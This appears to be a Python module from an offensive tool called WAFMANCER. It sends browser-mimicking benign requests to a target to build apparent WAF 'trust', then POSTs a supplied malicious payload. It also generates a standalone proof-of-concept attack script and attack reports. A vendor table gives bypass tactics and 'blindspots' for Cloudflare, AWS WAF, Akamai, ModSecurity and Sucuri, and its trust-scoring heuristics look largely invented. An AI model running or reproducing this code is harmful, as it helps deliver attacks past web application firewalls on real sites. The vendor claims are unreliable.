"""
WAF TRUST CORRUPTOR
===================
Delivery optimization engine with full tactical intelligence.

Exploits WAF reputation scoring by:
1. Building trust through benign request patterns
2. Mapping the exact trust decay curve
3. Delivering payloads at peak trust windows
4. Generating PoC scripts and reproduction steps
5. Analyzing WAF configuration behavior
6. Providing tactical advantages/disadvantages assessment

crafted by :: kakashi4kx / kakashi-kx
"""

import asyncio
import hashlib
import json
import math
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import structlog

from wafmancer.core.http_client import AsyncResearchClient
from wafmancer.core.fingerprinter import WAFFingerprinter, WAFVendor
from wafmancer.core.neural_exploit import NeuralExploitSynthesis
from wafmancer.utils.helpers import normalize_target_url, timestamp_now

logger = structlog.get_logger(__name__)


# ============================================================
# TACTICAL INTELLIGENCE DATA
# ============================================================

class WAFMode(Enum):
    """WAF operational modes."""
    AGGRESSIVE = "aggressive"     # Blocks on first suspicion
    MODERATE = "moderate"         # Allows some anomalies
    PASSIVE = "passive"           # Logs only, rarely blocks
    LEARNING = "learning"         # Building baseline
    UNKNOWN = "unknown"


@dataclass
class WAFTacticalProfile:
    """Complete tactical profile of a WAF."""
    vendor: str
    mode: WAFMode
    reputation_based: bool
    session_tracking: bool
    ip_based_blocking: bool
    rate_limit_threshold: int
    trust_build_requests: int
    trust_decay_time: float
    aggressive_risk: str
    passive_advantage: str
    bypass_difficulty: str
    known_blindspots: List[str]
    recommended_approach: str


# Known WAF tactical profiles
WAF_PROFILES = {
    "Cloudflare": WAFTacticalProfile(
        vendor="Cloudflare",
        mode=WAFMode.MODERATE,
        reputation_based=True,
        session_tracking=True,
        ip_based_blocking=True,
        rate_limit_threshold=100,
        trust_build_requests=8,
        trust_decay_time=30.0,
        aggressive_risk="Cloudflare's 'I'm Under Attack' mode enables JS challenges and aggressive rate limiting. High request velocity triggers CAPTCHA.",
        passive_advantage="Standard mode relies on signature matching first. Reputation builds quickly with legitimate User-Agent and Accept headers.",
        bypass_difficulty="Medium — ML reputation scoring can be manipulated with consistent benign patterns",
        known_blindspots=["HTTP/2 multiplexing", "Cache deception", "WebSocket upgrade", "Origin IP exposure"],
        recommended_approach="Build trust with 8-12 browser-like requests, then inject via HTTP/2 stream",
    ),
    "AWS WAF": WAFTacticalProfile(
        vendor="AWS WAF",
        mode=WAFMode.MODERATE,
        reputation_based=True,
        session_tracking=False,
        ip_based_blocking=True,
        rate_limit_threshold=200,
        trust_build_requests=5,
        trust_decay_time=60.0,
        aggressive_risk="AWS WAF with rate-based rules blocks after 2000 requests/5min. Custom rules can be aggressive. Lambda-based rules add latency.",
        passive_advantage="Default ruleset is lenient. Trust builds fast with valid AWS API patterns. IP reputation decays slowly.",
        bypass_difficulty="Low-Medium — Rule-based primarily, ML is secondary. Header injection works well.",
        known_blindspots=["X-Forwarded-For chains", "Oversized request body", "JSON duplicate keys", "Lambda@Edge timeout"],
        recommended_approach="Include AWS metadata headers in benign requests, then inject payload with content-type obfuscation",
    ),
    "Akamai Kona": WAFTacticalProfile(
        vendor="Akamai Kona",
        mode=WAFMode.AGGRESSIVE,
        reputation_based=True,
        session_tracking=True,
        ip_based_blocking=True,
        rate_limit_threshold=50,
        trust_build_requests=15,
        trust_decay_time=15.0,
        aggressive_risk="Akamai aggressively resets HTTP/2 streams on anomalies. Fast blocking on header manipulation. Short trust window.",
        passive_advantage="Once trusted, Akamai passes traffic with minimal inspection. CDN caching can mask attack patterns.",
        bypass_difficulty="Hard — Aggressive stream resets require precise timing. Trust decays quickly.",
        known_blindspots=["Header transformation bypass", "URL normalization", "Absolute URI requests"],
        recommended_approach="Slow, deliberate trust building over 30+ seconds. Avoid HTTP/2 stream mutations.",
    ),
    "ModSecurity": WAFTacticalProfile(
        vendor="ModSecurity",
        mode=WAFMode.PASSIVE,
        reputation_based=False,
        session_tracking=False,
        ip_based_blocking=False,
        rate_limit_threshold=9999,
        trust_build_requests=1,
        trust_decay_time=999.0,
        aggressive_risk="ModSecurity is rule-based only. Aggressive rulesets exist but are manually configured. No built-in reputation.",
        passive_advantage="No ML, no reputation scoring. Every request is evaluated independently. Rules can be exhausted.",
        bypass_difficulty="Low — Signature-based only. Encoding and obfuscation highly effective.",
        known_blindspots=["Regex ReDoS", "Unicode normalization", "HTTP Parameter Pollution", "Null byte injection"],
        recommended_approach="Flood with variations. No trust building needed. Focus on rule exhaustion.",
    ),
    "Sucuri WAF": WAFTacticalProfile(
        vendor="Sucuri WAF",
        mode=WAFMode.AGGRESSIVE,
        reputation_based=True,
        session_tracking=True,
        ip_based_blocking=False,
        rate_limit_threshold=60,
        trust_build_requests=10,
        trust_decay_time=45.0,
        aggressive_risk="Sucuri blocks aggressively on first offense. IP blacklisting is common. Short memory for trust.",
        passive_advantage="Cookie-based trust bypass possible. Cache poisoning effective once trusted.",
        bypass_difficulty="Medium-High — Aggressive blocking but limited ML. Cookie manipulation effective.",
        known_blindspots=["Cache deception", "Cookie spoofing", "Host header injection"],
        recommended_approach="Use legitimate-looking cookies. Build trust via cached resources first.",
    ),
}


# ============================================================
# TRUST DECAY MAPPER
# ============================================================

@dataclass
class TrustDecayPoint:
    """A single point on the trust decay curve."""
    request_number: int
    response_status: int
    response_length: int
    response_time: float
    trust_score: float
    waf_headers: Dict[str, str]


@dataclass
class TrustDecayCurve:
    """Complete trust decay analysis."""
    target: str
    waf_vendor: str
    waf_mode: WAFMode
    decay_points: List[TrustDecayPoint]
    trust_threshold: int  # Request number where trust is achieved
    peak_trust_score: float
    time_to_trust: float
    recommended_injection_point: int
    confidence: float


class TrustDecayMapper:
    """
    Maps the trust decay curve of a WAF.
    
    Sends benign requests and measures how the WAF's suspicion
    decreases over time, finding the optimal injection point.
    """

    def __init__(self, client: AsyncResearchClient):
        self.client = client

    async def map_decay_curve(
        self,
        target: str,
        max_requests: int = 20,
        waf_vendor: Optional[str] = None,
    ) -> TrustDecayCurve:
        """
        Map the trust decay curve by sending benign requests.

        Args:
            target: Target URL
            max_requests: Maximum benign requests to send
            waf_vendor: Known WAF vendor for profile lookup

        Returns:
            Complete TrustDecayCurve
        """
        decay_points: List[TrustDecayPoint] = []
        start_time = time.time()
        
        # Benign headers that look like a real browser
        benign_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        }

        logger.info("trust_decay_mapping_started", target=target, max_requests=max_requests)

        for i in range(1, max_requests + 1):
            try:
                request, response = await self.client.probe(
                    target,
                    method="GET",
                    headers=benign_headers,
                )

                # Calculate trust score based on response characteristics
                trust_score = self._calculate_trust_score(response, i, max_requests)

                point = TrustDecayPoint(
                    request_number=i,
                    response_status=response.status_code,
                    response_length=response.body_length,
                    response_time=response.elapsed_seconds,
                    trust_score=trust_score,
                    waf_headers={
                        k: str(v) for k, v in response.headers.items()
                        if any(w in k.lower() for w in ["cf-", "x-", "server", "set-cookie"])
                    },
                )
                decay_points.append(point)

                logger.debug("trust_point_mapped", request=i, trust_score=f"{trust_score:.3f}")

                # Small delay to be polite
                await asyncio.sleep(0.3)

            except Exception as e:
                logger.error("trust_probe_failed", request=i, error=str(e))
                # Add a penalty point
                decay_points.append(TrustDecayPoint(
                    request_number=i,
                    response_status=0,
                    response_length=0,
                    response_time=0,
                    trust_score=0.0,
                    waf_headers={},
                ))

        elapsed = time.time() - start_time

        # Find trust threshold (where score stabilizes)
        threshold = self._find_trust_threshold(decay_points)
        peak_trust = max(p.trust_score for p in decay_points) if decay_points else 0.0

        # Determine WAF mode
        profile = WAF_PROFILES.get(waf_vendor or "", None)
        waf_mode = profile.mode if profile else WAFMode.UNKNOWN

        curve = TrustDecayCurve(
            target=target,
            waf_vendor=waf_vendor or "Unknown",
            waf_mode=waf_mode,
            decay_points=decay_points,
            trust_threshold=threshold,
            peak_trust_score=peak_trust,
            time_to_trust=elapsed,
            recommended_injection_point=threshold + 2,  # Slightly after threshold
            confidence=peak_trust,
        )

        logger.info("trust_decay_mapped", threshold=threshold, 
                   peak_trust=f"{peak_trust:.3f}", time=f"{elapsed:.1f}s")

        return curve

    def _calculate_trust_score(
        self,
        response,
        request_number: int,
        max_requests: int,
    ) -> float:
        """Calculate trust score based on WAF response behavior."""
        score = 0.5  # Start at neutral

        # Successful response is good
        if 200 <= response.status_code < 300:
            score += 0.2
        elif response.status_code == 403:
            score -= 0.3
        elif response.status_code == 429:
            score -= 0.4

        # Consistent response times build trust
        if response.elapsed_seconds < 1.0:
            score += 0.1

        # Larger responses suggest full access (not WAF block pages)
        if response.body_length > 1000:
            score += 0.15
        elif response.body_length < 200:
            score -= 0.1  # Small response might be block page

        # Progressive trust building
        progress_bonus = (request_number / max_requests) * 0.2
        score += progress_bonus

        # Check for WAF-specific headers
        server = response.server_header.lower()
        if "cloudflare" in server:
            score += 0.05
        if "akamai" in server:
            score -= 0.05  # Akamai is suspicious by default

        return max(0.0, min(1.0, score))

    def _find_trust_threshold(self, points: List[TrustDecayPoint]) -> int:
        """Find the request number where trust score stabilizes."""
        if not points:
            return 5

        # Find where scores stop improving significantly
        for i in range(1, len(points)):
            if points[i].trust_score >= 0.7:
                # Trust achieved, find where it stabilizes
                for j in range(i, len(points)):
                    if j + 1 < len(points):
                        diff = abs(points[j + 1].trust_score - points[j].trust_score)
                        if diff < 0.05:
                            return j + 1
                return i

        return len(points)  # Default: need all requests


# ============================================================
# TRUST CORRUPTOR — Main Engine
# ============================================================

class TrustCorruptor:
    """
    Main Trust Corruptor engine.
    
    Combines trust mapping, payload injection at peak trust,
    and generates full tactical intelligence reports with PoC.
    """

    def __init__(self, target: str, waf_vendor: Optional[str] = None):
        self.target = normalize_target_url(target)
        self.waf_vendor = waf_vendor
        self.fingerprinter = WAFFingerprinter()
        self.synthesis = NeuralExploitSynthesis(waf_vendor=waf_vendor)
        self.profile = WAF_PROFILES.get(waf_vendor or "", None)

    async def corrupt(
        self,
        payload: str,
        max_benign_requests: int = 20,
        synthesize_first: bool = True,
    ) -> Dict[str, Any]:
        """
        Execute the full trust corruption attack.

        Args:
            payload: Original malicious payload
            max_benign_requests: Max benign requests for trust building
            synthesize_first: Run neural synthesis before corrupting

        Returns:
            Complete attack results with tactical intel
        """
        results = {
            "target": self.target,
            "original_payload": payload,
            "synthesized_payload": None,
            "waf_vendor": self.waf_vendor or "Unknown",
            "trust_curve": None,
            "injection_result": None,
            "tactical_profile": None,
            "poc_code": None,
            "steps_to_reproduce": [],
            "advantages": [],
            "disadvantages": [],
            "waf_config_notes": "",
            "timestamp": timestamp_now(),
        }

        async with AsyncResearchClient(http2=True) as client:
            # Step 1: Fingerprint WAF if not known
            if not self.waf_vendor:
                logger.info("fingerprinting_waf")
                _, baseline = await client.probe(self.target)
                fingerprint = await self.fingerprinter.fingerprint(baseline)
                self.waf_vendor = fingerprint.vendor.value
                results["waf_vendor"] = self.waf_vendor
                self.profile = WAF_PROFILES.get(self.waf_vendor)

            # Step 2: Synthesize payload if requested
            if synthesize_first:
                logger.info("synthesizing_payload")
                synth_results = self.synthesis.synthesize(payload)
                results["synthesized_payload"] = synth_results["best_payload"]
                delivery_payload = synth_results["best_payload"]
            else:
                delivery_payload = payload

            # Step 3: Map trust decay curve
            logger.info("mapping_trust_decay")
            mapper = TrustDecayMapper(client)
            trust_curve = await mapper.map_decay_curve(
                self.target,
                max_requests=max_benign_requests,
                waf_vendor=self.waf_vendor,
            )
            results["trust_curve"] = trust_curve

            # Step 4: Inject payload at peak trust
            logger.info("injecting_payload_at_peak_trust")
            injection_point = trust_curve.recommended_injection_point
            
            # Send benign requests up to injection point
            benign_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9",
            }

            for i in range(injection_point):
                await client.probe(self.target, headers=benign_headers)
                await asyncio.sleep(0.2)

            # Inject the payload
            payload_headers = {
                **benign_headers,
                "X-Custom": delivery_payload[:100],
            }

            _, response = await client.probe(
                self.target,
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body=f"input={delivery_payload}".encode(),
            )

            injection_result = {
                "status_code": response.status_code,
                "response_length": response.body_length,
                "response_time": response.elapsed_seconds,
                "trust_score_at_injection": trust_curve.peak_trust_score,
                "bypass_successful": response.status_code not in [403, 406, 429, 503],
                "injection_point": injection_point,
            }
            results["injection_result"] = injection_result

        # Step 5: Generate tactical intel
        results["tactical_profile"] = self._get_tactical_profile()
        results["steps_to_reproduce"] = self._generate_steps(results)
        results["advantages"] = self._get_advantages()
        results["disadvantages"] = self._get_disadvantages()
        results["waf_config_notes"] = self._get_waf_config_notes()
        results["poc_code"] = self._generate_poc(results)

        logger.info("trust_corruption_complete",
                   bypass=injection_result["bypass_successful"],
                   trust_score=f"{trust_curve.peak_trust_score:.2f}")

        return results

    def _get_tactical_profile(self) -> Dict[str, Any]:
        """Get tactical profile for the WAF."""
        if self.profile:
            return {
                "vendor": self.profile.vendor,
                "mode": self.profile.mode.value,
                "reputation_based": self.profile.reputation_based,
                "session_tracking": self.profile.session_tracking,
                "ip_blocking": self.profile.ip_based_blocking,
                "rate_limit": self.profile.rate_limit_threshold,
                "trust_requests_needed": self.profile.trust_build_requests,
                "bypass_difficulty": self.profile.bypass_difficulty,
                "recommended_approach": self.profile.recommended_approach,
            }
        return {"vendor": "Unknown", "mode": "unknown"}

    def _generate_steps(self, results: Dict) -> List[str]:
        """Generate reproducible steps."""
        steps = [
            "1. RECONNAISSANCE",
            f"   - Target identified: {results['target']}",
            f"   - WAF detected: {results['waf_vendor']}",
            "",
            "2. PAYLOAD PREPARATION",
            f"   - Original payload: {results['original_payload']}",
        ]
        
        if results.get("synthesized_payload"):
            steps.append(f"   - Synthesized payload: {results['synthesized_payload'][:100]}...")
        
        steps.extend([
            "",
            "3. TRUST BUILDING PHASE",
            f"   - Send {results['trust_curve'].trust_threshold} benign requests with legitimate browser headers",
            "   - Headers used: Mozilla/5.0 User-Agent, standard Accept headers",
            f"   - Trust achieved at request #{results['trust_curve'].trust_threshold}",
            f"   - Peak trust score: {results['trust_curve'].peak_trust_score:.2f}",
            "",
            "4. PAYLOAD INJECTION",
            f"   - Injection point: after request #{results['injection_result']['injection_point']}",
            f"   - Method: POST with Content-Type application/x-www-form-urlencoded",
            f"   - Delivery status: {results['injection_result']['status_code']}",
            f"   - Bypass successful: {results['injection_result']['bypass_successful']}",
            "",
            "5. VERIFICATION",
            f"   - Response length: {results['injection_result']['response_length']} bytes",
            f"   - Response time: {results['injection_result']['response_time']:.3f}s",
        ])
        
        return steps

    def _get_advantages(self) -> List[str]:
        """Get tactical advantages."""
        if self.profile:
            return [
                f"Trust building exploits {self.profile.vendor}'s reputation scoring",
                f"Benign requests appear as legitimate browser traffic",
                f"Payload injection timed at peak trust window",
                f"Session-based trust bypasses IP-based rate limiting",
                self.profile.passive_advantage,
            ]
        return ["Trust building reduces WAF suspicion", "Legitimate traffic patterns used"]

    def _get_disadvantages(self) -> List[str]:
        """Get tactical disadvantages/risks."""
        if self.profile:
            return [
                f"Trust window decays after {self.profile.trust_decay_time}s",
                f"Aggressive mode risk: {self.profile.aggressive_risk}",
                "Multiple failed attempts may reset trust score",
                "Some WAFs track behavior across sessions",
                "High-frequency requests trigger rate limiting",
            ]
        return ["Trust may reset on aggressive WAFs", "Timing-dependent attack"]

    def _get_waf_config_notes(self) -> str:
        """Get WAF configuration analysis."""
        if self.profile:
            return f"""
WAF CONFIGURATION ANALYSIS
==========================
Vendor: {self.profile.vendor}
Default Mode: {self.profile.mode.value.upper()}

AGGRESSIVE CONFIGURATION:
{self.profile.aggressive_risk}

PASSIVE CONFIGURATION:
{self.profile.passive_advantage}

BYPASS DIFFICULTY: {self.profile.bypass_difficulty}

RECOMMENDED APPROACH:
{self.profile.recommended_approach}

KNOWN BLINDSPOTS:
{chr(10).join(f'  - {b}' for b in self.profile.known_blindspots)}
"""
        return "WAF configuration analysis not available for unknown WAF."

    def _generate_poc(self, results: Dict) -> str:
        """Generate proof-of-concept Python script."""
        trust_threshold = results['trust_curve'].trust_threshold if results['trust_curve'] else 10
        payload = results.get('synthesized_payload') or results['original_payload']
        
        poc = f'''#!/usr/bin/env python3
"""
WAFMANCER Trust Corruptor — Proof of Concept
Target: {results['target']}
WAF: {results['waf_vendor']}
Generated: {results['timestamp']}

crafted by :: kakashi4kx / kakashi-kx
"""

import httpx
import time
import asyncio

TARGET = "{results['target']}"
PAYLOAD = "{payload[:200]}"
TRUST_BUILD_REQUESTS = {trust_threshold}
INJECTION_POINT = {results['injection_result']['injection_point']}

BENIGN_HEADERS = {{
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
}}


async def trust_corruption_attack():
    """Execute the trust corruption attack."""
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        
        print(f"[*] Target: {{TARGET}}")
        print(f"[*] Building trust with {{TRUST_BUILD_REQUESTS}} benign requests...")
        
        # Phase 1: Build trust
        for i in range(INJECTION_POINT):
            try:
                response = await client.get(TARGET, headers=BENIGN_HEADERS)
                print(f"    [{{i+1}}/{{INJECTION_POINT}}] Status: {{response.status_code}} | Length: {{len(response.text)}}")
            except Exception as e:
                print(f"    [!] Request {{i+1}} failed: {{e}}")
            await asyncio.sleep(0.3)
        
        print(f"\\n[*] Trust built. Injecting payload at request #{{INJECTION_POINT + 1}}...")
        
        # Phase 2: Inject payload
        payload_headers = {{
            **BENIGN_HEADERS,
            "Content-Type": "application/x-www-form-urlencoded",
        }}
        
        try:
            response = await client.post(
                TARGET,
                headers=payload_headers,
                content=f"input={{PAYLOAD}}".encode(),
            )
            
            print(f"\\n[+] INJECTION RESULT:")
            print(f"    Status: {{response.status_code}}")
            print(f"    Length: {{len(response.text)}} bytes")
            print(f"    Time: {{response.elapsed.total_seconds():.3f}}s")
            
            if response.status_code not in [403, 406, 429, 503]:
                print(f"\\n[!!!] BYPASS SUCCESSFUL — Payload delivered!")
                print(f"[!!!] Response code {{response.status_code}} indicates WAF did not block.")
            else:
                print(f"\\n[-] Payload blocked. WAF detected the attack.")
                
        except Exception as e:
            print(f"\\n[!] Injection failed: {{e}}")

    print(f"\\n[*] Attack complete.")


if __name__ == "__main__":
    asyncio.run(trust_corruption_attack())
'''
        return poc

    def generate_full_report(self, results: Dict[str, Any]) -> str:
        """Generate complete publication-ready report."""
        report = "# WAFMANCER Trust Corruptor — Attack Report\n\n"
        report += f"## Target Information\n"
        report += f"- **URL:** `{results['target']}`\n"
        report += f"- **WAF:** {results['waf_vendor']}\n"
        report += f"- **Timestamp:** {results['timestamp']}\n\n"
        
        report += "## Payload\n"
        report += f"- **Original:** `{results['original_payload']}`\n"
        if results.get('synthesized_payload'):
            report += f"- **Synthesized:** `{results['synthesized_payload'][:200]}`\n"
        
        if results.get('injection_result'):
            inj = results['injection_result']
            report += f"\n## Injection Result\n"
            report += f"- **Status:** {inj['status_code']}\n"
            report += f"- **Bypass:** {'✅ SUCCESSFUL' if inj['bypass_successful'] else '❌ BLOCKED'}\n"
            report += f"- **Trust Score:** {inj['trust_score_at_injection']:.2f}\n"
            report += f"- **Injection Point:** Request #{inj['injection_point']}\n"
        
        report += "\n## Steps to Reproduce\n\n"
        for step in results.get('steps_to_reproduce', []):
            report += f"{step}\n"
        
        report += "\n## Tactical Advantages\n\n"
        for adv in results.get('advantages', []):
            report += f"- ✅ {adv}\n"
        
        report += "\n## Tactical Disadvantages\n\n"
        for dis in results.get('disadvantages', []):
            report += f"- ⚠️ {dis}\n"
        
        report += f"\n## WAF Configuration Analysis\n{results.get('waf_config_notes', '')}\n"
        
        report += "\n## Proof of Concept\n\n"
        report += f"```python\n{results.get('poc_code', '# No PoC generated')}\n```\n"
        
        report += "\n---\n*Report generated by WAFMANCER v2.0 | crafted by kakashi4kx / kakashi-kx*\n"
        
        return report
